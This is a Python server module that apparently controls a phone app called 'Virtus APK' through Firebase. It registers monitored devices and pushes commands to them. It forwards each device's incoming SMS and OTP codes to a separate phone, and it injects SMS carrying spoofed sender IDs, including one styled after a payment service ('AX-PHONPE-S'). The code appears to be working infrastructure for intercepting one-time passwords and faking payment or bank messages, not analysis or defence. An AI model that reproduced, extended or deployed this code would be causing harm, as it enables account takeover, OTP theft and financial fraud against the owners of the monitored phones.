import json
import logging
import time
from datetime import datetime, timezone
from urllib.parse import quote

import httpx

from app.config import get_settings
from app.database import Device, MonitorProfile, OutboundSMS
from app.firebase_client import normalize_firebase_url

logger = logging.getLogger(__name__)
settings = get_settings()

OUTGOING_SENDER = "__OUT__"


def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
    if profile.firebase_url:
        return normalize_firebase_url(profile.firebase_url)
    if profile.license_key and profile.license_key.lower().startswith("http"):
        return normalize_firebase_url(profile.license_key)
    return None


def resolve_firebase_url(
    profile: MonitorProfile,
    device: Device | None = None,
) -> str | None:
    """Firebase URL where inject/outbound messages are stored."""
    if device and device.firebase_source_url:
        return normalize_firebase_url(device.firebase_source_url)
    user_url = get_profile_firebase_url(profile)
    if user_url:
        return user_url
    license_key = get_license_key(profile)
    if license_key and license_key.upper().startswith("KEY-"):
        return settings.virtus_module_db.rstrip("/")
    return None


def resolve_apk_poll_id(profile: MonitorProfile, device: Device | None = None) -> str:
    """APK on /mynum phone polls messages/{this_id}."""
    if profile.phone_number:
        return mynum_device_id(profile.phone_number)
    if device:
        return device.name
    return ""


def get_license_key(profile: MonitorProfile) -> str | None:
    if profile.license_key:
        return profile.license_key.strip()
    if profile.firebase_url:
        return normalize_firebase_url(profile.firebase_url)
    return None


def _config_path_key(license_key: str) -> str:
    key = license_key.strip()
    if key.lower().startswith("http"):
        return quote(key, safe="")
    return key.upper()


_http_client: httpx.AsyncClient | None = None


def _get_http_client() -> httpx.AsyncClient:
    global _http_client
    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(timeout=5.0, follow_redirects=True)
    return _http_client


async def _firebase_put(url: str, data: dict) -> None:
    client = _get_http_client()
    response = await client.put(f"{url}.json", json=data)
    response.raise_for_status()


async def push_virtus_config(profile: MonitorProfile, device: Device | None = None) -> None:
    """Push config for Virtus APK (virtus_config + module DB config/{KEY})."""
    module_db = settings.virtus_module_db.rstrip("/")
    firebase_url = resolve_firebase_url(profile, device)
    if not firebase_url:
        return

    license_key = get_license_key(profile)
    device_id = resolve_apk_poll_id(profile, device)
    monitoring = profile.is_monitoring
    key_valid = False

    if license_key and license_key.upper().startswith("KEY-"):
        from app.license_keys import license_key_exists, push_key_config

        key_valid = license_key_exists(license_key)
        if key_valid:
            firebase_bases = [profile.firebase_url] if profile.firebase_url else None
            await push_key_config(
                license_key,
                monitoring=monitoring,
                device_id=device_id,
                channel_id=profile.channel_id,
                target_number=profile.phone_number,
                sim_index=profile.selected_sim_index or 0,
                firebase_bases=firebase_bases or [firebase_url],
                firebase_url=firebase_url,
            )

    sim_index = profile.selected_sim_index or 0
    sim_slot = sim_index + 1
    if device and device.device_meta:
        try:
            meta = json.loads(device.device_meta)
            sims = meta.get("sims") or []
            if sims and 0 <= sim_index < len(sims):
                sim_slot = int(sims[sim_index].get("slot") or sim_slot)
        except (json.JSONDecodeError, TypeError, ValueError):
            pass

    payload = {
        "monitoring": monitoring,
        "key_valid": key_valid,
        "license_key": license_key if key_valid else "",
        "ts": int(time.time() * 1000),
        "firebase_url": firebase_url,
        "device_id": device_id,
        "firebase_key": license_key if key_valid else "",
        "channel_id": profile.channel_id,
        "target_number": profile.phone_number,
        "sim_index": sim_index,
        "sim_slot": sim_slot,
    }

    user_fb = get_profile_firebase_url(profile)
    if user_fb:
        await _firebase_put(f"{user_fb}/virtus_config", payload)
        if key_valid and license_key:
            await _firebase_put(f"{user_fb}/config/{_config_path_key(license_key)}", payload)


async def push_outgoing_sms_command(
    firebase_url: str,
    device_id: str,
    to_number: str,
    message: str,
    sim_index: int = 0,
    sim_slot: int | None = None,
    spoof_sender: str | None = None,
) -> str:
    """Queue outgoing SMS send for device/APK: {firebase}/commands/{device_id}/{id}."""
    base = normalize_firebase_url(firebase_url)
    command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
    payload = {
        "to": to_number,
        "message": message,
        "sim_index": sim_index,
        "sim_slot": sim_slot or (sim_index + 1),
        "spoof_sender": spoof_sender,
        "status": "pending",
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/commands/{device_id}/{command_id}", payload)
    return command_id


async def push_inject_message(
    firebase_url: str,
    device_id: str,
    sender: str,
    body: str,
) -> str:
    """Queue SMS inject for Virtus APK: {firebase}/messages/{device_id}/{id}."""
    from app.channel_relay import prepare_sms_forward

    sender, body = prepare_sms_forward(sender, body)
    base = normalize_firebase_url(firebase_url)
    message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
    payload = {
        "sender": sender,
        "body": body,
        "injected": False,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/messages/{device_id}/{message_id}", payload)
    return message_id


async def register_device_on_firebase(
    firebase_url: str,
    device: Device,
    profile: MonitorProfile,
) -> None:
    base = normalize_firebase_url(firebase_url)
    meta = {}
    if device.device_meta:
        try:
            meta = json.loads(device.device_meta)
        except json.JSONDecodeError:
            meta = {}

    payload = {
        "name": device.name,
        "phone": device.phone_number,
        "battery": meta.get("battery") or meta.get("battery_level"),
        "online": True,
        "sim_index": profile.selected_sim_index or 0,
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/devices/{device.name}", payload)


async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | None = None) -> None:
    if not resolve_firebase_url(profile, device):
        return
    try:
        await push_virtus_config(profile, device)
        if device:
            firebase_url = resolve_firebase_url(profile, device)
            if firebase_url:
                await register_device_on_firebase(firebase_url, device, profile)
                base = normalize_firebase_url(firebase_url)
                await _firebase_put(
                    f"{base}/devices/{device.name}/monitoring",
                    {
                        "active": profile.is_monitoring,
                        "sim_index": profile.selected_sim_index or 0,
                        "ts": int(time.time() * 1000),
                    },
                )
    except Exception as exc:
        logger.warning("Firebase profile sync failed: %s", exc)


def mynum_device_id(phone_number: str) -> str:
    """Virtus APK device id for /mynum phone (see set_user_phone)."""
    from app.services import normalize_phone

    return f"num-{normalize_phone(phone_number)}"


async def push_outbound_to_firebase(
    profile: MonitorProfile,
    device: Device,
    outbound: OutboundSMS,
) -> str | None:
    """Push outgoing send or inject command to Firebase for Virtus APK."""
    firebase_url = resolve_firebase_url(profile, device)
    if not firebase_url:
        return None

    try:
        if outbound.spoof_sender and outbound.to_number:
            # Inject on /mynum phone so inbox shows original sender (AX-PHONPE-S, etc.)
            return await push_inject_message(
                firebase_url,
                mynum_device_id(outbound.to_number),
                outbound.spoof_sender,
                outbound.message,
            )
        if outbound.spoof_sender:
            return await push_inject_message(
                firebase_url,
                device.name,
                outbound.spoof_sender,
                outbound.message,
            )
        body = f"{outbound.to_number}\n{outbound.message}\n{outbound.sim_index}"
        command_id = await push_inject_message(
            firebase_url,
            device.name,
            OUTGOING_SENDER,
            body,
        )
        try:
            await push_outgoing_sms_command(
                firebase_url,
                device.name,
                outbound.to_number,
                outbound.message,
                sim_index=outbound.sim_index,
                sim_slot=outbound.sim_slot,
            )
        except Exception:
            pass
        return command_id
    except Exception as exc:
        logger.warning("Firebase outbound push failed: %s", exc)
        return None


async def send_polling_startup_test(
    db,
    profile: MonitorProfile,
    device: Device,
) -> tuple[int, int]:
    """On monitoring start — inject test SMS to /mynum phone via Firebase."""
    import time

    from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER

    if not profile.phone_number or not profile.is_monitoring:
        return 0, 0

    firebase_url = resolve_firebase_url(profile, device)
    if not firebase_url:
        logger.warning("Startup test skipped: no firebase URL")
        return 0, 0

    poll_id = mynum_device_id(profile.phone_number)
    t0 = time.perf_counter()
    try:
        await push_inject_message(
            firebase_url,
            poll_id,
            STARTUP_TEST_SENDER,
            STARTUP_TEST_MESSAGE,
        )
        total_ms = max(1, int((time.perf_counter() - t0) * 1000))
        return 1, total_ms
    except Exception as exc:
        logger.warning("Startup test inject failed: %s", exc)
        return 0, max(1, int((time.perf_counter() - t0) * 1000))


async def forward_incoming_to_mynum(
    db,
    profile: MonitorProfile,
    device: Device,
    sender: str,
    message: str,
) -> None:
    """Forward incoming SMS/OTP to /mynum via inject — same sender ID (Astik-style)."""
    from app.channel_relay import queue_forward_to_mynum

    if not profile.phone_number or not profile.is_monitoring:
        return

    try:
        outbound = queue_forward_to_mynum(db, profile, device, sender, message)
        await push_outbound_to_firebase(profile, device, outbound)
    except Exception as exc:
        logger.warning("Forward to mynum failed for device %s: %s", device.id, exc)
